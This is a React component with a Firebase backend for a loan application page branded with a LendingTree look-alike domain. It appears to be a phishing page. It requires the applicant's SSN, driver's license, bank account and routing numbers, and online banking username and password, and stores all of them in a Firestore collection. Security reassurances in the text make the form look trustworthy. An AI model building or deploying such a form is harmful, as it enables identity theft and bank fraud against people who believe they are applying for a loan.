import logo from "../../assets/logo.svg";
import file from "../../assets/ios-files-logo.png";
import book from "../../assets/book.png";
import briefcase from "../../assets/briefcase.png";
import bank from "../../assets/bank.png";
import { Link } from "react-router-dom";
import { db } from "../../../firebase";
import { useState } from "react";
import { doc, addDoc, collection } from "firebase/firestore";

const Details = (e) => {
  const [loanAmount, setLoanAmount] = useState("");
  const [firstName, setFirstName] = useState("");
  const [middleName, setMiddleName] = useState("");
  const [lastName, setLastName] = useState("");
  const [email, setEmail] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [DOB, setDOB] = useState("");
  const [streetAddress, setStreetAddress] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");
  const [zip, setZip] = useState("");
  const [license, setLicense] = useState("");
  const [licenseState, setLicenseState] = useState("");
  const [ssn, setSsn] = useState("");
  const [routingNumber, setRoutingNumber] = useState("");
  const [bankName, setBankName] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [bankingUsername, setBankingUsername] = useState("");
  const [bankingPassword, setBankingPassword] = useState("");
  const [isChecked, setIsChecked] = useState(false);

  function handleCheckboxChange(event) {
    setIsChecked(event.target.checked);
  }

  function handleSubmit(e) {
    e.preventDefault();
    const myCollectionRef = collection(db, "lending_users_data");
    addDoc(myCollectionRef, {
      Loan_Amount: loanAmount,
      Legal_First_Name: firstName,
      Legal_Middle_Name: middleName,
      Legal_Last_Name: lastName,
      Legal_Email: email,
      Phone_Number: phoneNumber,
      Date_Of_Birth: DOB,
      Street_Address: streetAddress,
      City: city,
      State: state,
      Zip: zip,
      Drivers_License_ID_Card: license,
      License_State: licenseState,
      SSN: ssn,
      ABA_Routing_Number: routingNumber,
      Bank_Name: bankName,
      Account_Number: accountNumber,
      Mobile_Banking_Username: bankingUsername,
      Mobile_Banking_Password: bankingPassword,
    })
      .then((docRef) => {
        console.log("Document written with ID: ", docRef.id);
      })
      .catch((error) => {
        console.error("Error adding document: ", error);
      });
  }
  return (
    <>
      <div className=" bg-[#101f30] p-4 w-full ">
        <div className="flex justify-between items-center w-[95%] mx-auto">
          <div className="h-7 w-28 ">
            <Link to="/">
              <img
                src={logo}
                className="object-cover h-full w-full cursor-pointer  "
                alt="Your Image"
              />
            </Link>
          </div>

          <button
            type="button"
            className="text-white bg-gradient-to-r hover:to-green-400 hover:from-blue-500 from-pink-500 to-yellow-500 p-4 rounded-xl"
          >
            <Link to="/apply">RETURNING CUSTOMER</Link>
          </button>
        </div>
      </div>
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 ">
        <form
          className="col-span-2 w-full p-4 md:w-full lg:w-[70%] ml-auto  sm:p-10"
          onSubmit={handleSubmit}
        >
          <div className="flex flex-wrap flex-col gap-5">
            <div className="flex items-center">
              <img src={file} className="w-10  " alt="Your Image" />

              <h1 className="font-sans font-semibold text-2xl">
                PERSONAL DETAILS
              </h1>
            </div>

            <div>
              <p>Tell us how much you need...</p>
              <div>
                <p className="font-bold">*Loan Amount</p>
                <select
                  name="loans"
                  id="loans"
                  required
                  className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                  onChange={(e) => setLoanAmount(e.target.value)}
                >
                  <option value="2000">$2,000</option>
                  <option value="2500">$2,500</option>
                  <option value="3000">$3,000</option>
                  <option value="3500">$3,500</option>
                  <option value="4000">$4,000</option>
                  <option value="4500">$4,500</option>
                  <option value="5000">$5,000</option>
                  <option value="5500">$5,500</option>
                  <option value="6000">$6,000</option>
                  <option value="6500">$6,500</option>
                  <option value="7000">$7,000</option>
                  <option value="7500">$7,500</option>
                  <option value="8000">$8,000</option>
                  <option value="8500">$8,500</option>
                  <option value="9000">$9,000</option>
                  <option value="9500">$9,500</option>
                  <option value="10000">$10,000</option>
                </select>
              </div>
            </div>
            <hr />
            <div className="flex flex-col space-y-5">
              <div className="flex flex-col sm:flex-row gap-5">
                <div>
                  <p className="font-bold">*Legal First Name</p>
                  <input
                    required
                    type="text"
                    placeholder="Legal First Name"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setFirstName(e.target.value)}
                  />
                </div>

                <div>
                  <p className="font-bold">*Legal Middle Name</p>
                  <input
                    required
                    type="text"
                    placeholder="Legal Middle Name"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setMiddleName(e.target.value)}
                  />
                </div>
              </div>
              <div className="flex flex-col sm:flex-row gap-5">
                <div>
                  <p className="font-bold">*Legal Last Name</p>
                  <input
                    required
                    type="text"
                    placeholder="Legal Last Name"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setLastName(e.target.value)}
                  />
                </div>
                <div>
                  <p className="font-bold">*Email</p>
                  <input
                    required
                    type="text"
                    placeholder="Email"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setEmail(e.target.value)}
                  />
                </div>
              </div>
              <div className="flex flex-col sm:flex-row gap-5">
                <div>
                  <p className="font-bold">*Phone Number</p>
                  <input
                    required
                    type="text"
                    placeholder="Phone Number"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                  />
                </div>
                <div>
                  <p className="font-bold">*DOB</p>
                  <input
                    required
                    type="text"
                    placeholder="DOB"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setDOB(e.target.value)}
                  />
                </div>
              </div>
            </div>
          </div>
          <div className="flex flex-col gap-5 mt-5">
            <div className="flex items-center">
              <img src={book} className="w-10  " alt="Your Image" />

              <h1 className="font-sans font-semibold text-2xl">MORE DETAILS</h1>
            </div>

            <div className="flex flex-col space-y-5">
              <div className="flex flex-col sm:flex-row gap-5">
                <div>
                  <p className="font-bold">*Street Address</p>
                  <input
                    required
                    type="text"
                    placeholder="Street Address"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setStreetAddress(e.target.value)}
                  />
                </div>
                <div>
                  <p className="font-bold">*City</p>
                  <input
                    required
                    type="text"
                    placeholder="City"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setCity(e.target.value)}
                  />
                </div>
              </div>
              <div className="flex flex-col sm:flex-row gap-5">
                <div>
                  <p className="font-bold">*State</p>
                  <input
                    required
                    type="text"
                    placeholder="State"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setState(e.target.value)}
                  />
                </div>
                <div>
                  <p className="font-bold">*Zip</p>
                  <input
                    required
                    type="text"
                    placeholder="Zip"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setZip(e.target.value)}
                  />
                </div>
              </div>
              <div className="flex flex-col sm:flex-row gap-5">
                <div>
                  <p className="font-bold">*Driver's License/ID Card</p>
                  <input
                    required
                    type="text"
                    placeholder="Driver's License or Other Card"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setLicense(e.target.value)}
                  />
                </div>
                <div>
                  <p className="font-bold">*License State</p>
                  <input
                    required
                    type="text"
                    placeholder="License State"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setLicenseState(e.target.value)}
                  />
                </div>
              </div>
            </div>
          </div>
          <div className="mt-5 space-y-5">
            <div className="flex items-center">
              <img src={briefcase} className="w-10  " alt="Your Image" />

              <h1 className="font-sans font-semibold text-2xl">
                IDENTITY VERIFICATION
              </h1>
            </div>

            <div>
              <p className="font-bold">*SSN</p>
              <input
                required
                type="text"
                placeholder="XXX-XX-XXXX"
                className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                onChange={(e) => setSsn(e.target.value)}
              />
            </div>
          </div>
          <div className="flex flex-col gap-5 mt-5">
            <div className="flex items-center">
              <img src={bank} className="w-10  " alt="Your Image" />

              <h1 className="font-sans font-semibold text-2xl">
                BANK ACCOUNT INFO
              </h1>
            </div>

            <div className="flex flex-col space-y-5">
              <div className="flex flex-col sm:flex-row gap-5">
                <div>
                  <p className="font-bold">*ABA/Routing Number</p>
                  <input
                    required
                    type="text"
                    placeholder="ABA/Routing Number"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setRoutingNumber(e.target.value)}
                  />
                </div>
                <div>
                  <p className="font-bold">*Bank Name</p>
                  <input
                    required
                    type="text"
                    placeholder="Bank Name"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setBankName(e.target.value)}
                  />
                </div>
              </div>
              <div className="flex flex-col sm:flex-row gap-5">
                <div>
                  <p className="font-bold">*Account Number</p>
                  <input
                    required
                    type="text"
                    placeholder="Account Number"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setAccountNumber(e.target.value)}
                  />
                </div>
                <div>
                  <p className="font-bold">*Mobile/Online Banking Username</p>
                  <input
                    required
                    type="text"
                    placeholder="Mobile/Online Banking Username"
                    className={`h-16  w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setBankingUsername(e.target.value)}
                  />
                </div>
              </div>
              <div className="flex flex-col sm:flex-row gap-5">
                <div>
                  <p className="font-bold">*Mobile/Online Banking Password</p>
                  <input
                    required
                    type="text"
                    placeholder="Mobile/Online Banking Password"
                    className={`h-16 w-full  sm:w-full  sm:w-72 py-2 pr-2 pl-8 border-2  border-gray-300 focus:outline-none `}
                    onChange={(e) => setBankingPassword(e.target.value)}
                  />
                </div>
              </div>
            </div>
          </div>
          <label className="mt-4 block space-y-5 ">
            <input
              required
              className="h-4 w-4"
              type="checkbox"
              checked={isChecked}
              onChange={handleCheckboxChange}
            />
            I consent to receive calls, texts and pre-recorded messages from
            lendingtree.services, and its lending and/or network partners.
            Message and data rates may apply.**
          </label>

          <button
            className={`mt-5 bg-blue-500 text-white px-4 py-2 rounded-md block mx-auto ${
              !isChecked ? "cursor-not-allowed" : ""
            }`}
            type="submit"
            disabled={!isChecked}
          >
            SUBMIT
          </button>

          <p className="mt-5">
            By clicking Find My Loan, I agree to receive important notices and
            other communications electronically. Terms & Conditions and Privacy
            Policy apply. ** Message Frequency: 2 msgs/week. I understand I may
            opt-out of SMS communication by replying ‘STOP’ or ’HELP' for more
            information, or by contacting contact@lendingthree.services. Consent
            to receive texts and calls is not required as a condition of
            purchasing any products or services. See SMS Policy for more
            details. I certify that I am a US resident over 18, and all
            information submitted with this loan request is true and accurate to
            the best of my knowledge.
          </p>
        </form>
        <div className="col-span-1 md:col-span-3 lg:col-span-1 bg-blue-500 h-[100%] flex w-full flex-col gap-3 p-10">
          <h1 className="text-white text-4xl font-bold">Need Help ?</h1>
          <p className="text-white text-[18px]">
            If you are unsure what to enter in a particular field, please refer
            to this pane and you will see a message with detailed instructions.
          </p>
          <div>
            <img src="" alt="" />
            <p className="text-white text-[18px] ">
              We use 256-bit SSL encryption and strict high levels of security
              to keep your information safe.
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default Details;
